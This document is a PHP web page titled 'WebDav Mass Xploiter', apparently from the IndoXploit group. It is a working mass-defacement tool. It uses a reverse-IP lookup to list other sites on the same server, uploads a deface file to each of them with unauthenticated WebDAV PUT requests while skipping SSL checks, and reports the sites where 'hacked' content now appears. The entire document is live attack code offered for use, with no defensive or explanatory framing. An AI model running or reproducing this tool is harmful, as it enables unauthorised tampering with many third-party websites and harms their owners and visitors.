<html>
<head>
<title>WebDav Mass Crottter</title>
<meta name="author" content="IndoXploit">
<style type="text/css">
html {
	margin: 20px auto;
	background: #000000;
	color: lime;
}
header {
	color: lime;
	font-size: 35px;
	margin: 10px auto;
	text-align: center;
	text-decoration: underline;
}
input[type=text] {
	border: 1px solid #008000;
	color: #bb0000;
	width: 500px;
	height: 20px;
	padding-left: 5px;
	margin: 5px auto;
	background: transparent;
}
input[type=submit] {
	border: 1px solid #008000;
	color: #bb0000;
	background: transparent;
	width: 500px;
}
textarea {
	background: transparent;
	color: #bb0000;
	border: 1px solid #008000;
	resize: none;
	width: 500px;
	height: 250px;
	padding-left: 5px;
	margin: 5px auto;
}
a {
	text-decoration: none;
	color: lime;
}
a:hover {
	text-decoration: underline;
}
</style>
</head>
<center>
<header>WebDav Mass Xploiter</header>
<?php
set_time_limit(0);

function reverse($url) {
	$ch = curl_init("http://domains.yougetsignal.com/domains.php");
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
		  curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$url&ket=");
		  curl_setopt($ch, CURLOPT_HEADER, 0);
		  curl_setopt($ch, CURLOPT_POST, 1);
	$resp = curl_exec($ch);
	$resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
	$array = explode(",,", $resp);
	unset($array[0]);
	foreach($array as $lnk) {
		$lnk = "http://$lnk";
		$lnk = str_replace(",", "", $lnk);
		echo $lnk."\n";
		ob_flush();
		flush();
	}
		  curl_close($ch);
}
function dav($url, $file) {
	$fp = fopen($file, "r");
	$filesize = filesize($file);
	$ch = curl_init();
		  curl_setopt($ch, CURLOPT_URL, $url);
		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		  curl_setopt($ch, CURLOPT_PUT, true);
		  curl_setopt($ch, CURLOPT_INFILE, $fp);
		  curl_setopt($ch, CURLOPT_INFILESIZE, $filesize);
		  curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
		  curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
		  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	return curl_exec($ch);
		  curl_close($ch);
}
function cek($url) {
	$ch = curl_init($url);
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	$resp = curl_exec($ch);
	return $resp;
}

$sites = explode("\r\n", $_POST['url']);
$f = htmlspecialchars($_POST['file_deface']);
if($_POST['hajar']) {
	foreach($sites as $url) {
		$link = $url."/".$f;
		$fp = fopen($f, "r");
		$filesize = filesize($f);
		$ch = curl_init();
			  curl_setopt($ch, CURLOPT_URL, $link);
			  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
			  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
			  curl_setopt($ch, CURLOPT_PUT, true);
			  curl_setopt($ch, CURLOPT_INFILE, $fp);
			  curl_setopt($ch, CURLOPT_INFILESIZE, $filesize);
			  curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
			  curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
			  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
			  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
		$res = curl_exec($ch);
		$cek = cek($link);
		if(preg_match("/hacked/i", $cek)) {
			echo "exploited! -> <a href='$link' target='_blank'>$link</a><br>";
		}
	}
} else {
?>
<form method="post">
File Deface: <br>
<input type="text" name="file_deface" placeholder="deface.html" value="deface.html" required><br>
Domains: <br>
<textarea name="url"><?php reverse($_SERVER['HTTP_HOST']); ?></textarea><br>
<input type="submit" name="hajar" value="Xploit!">
</form>
</center>
<?php
}
?>
</html>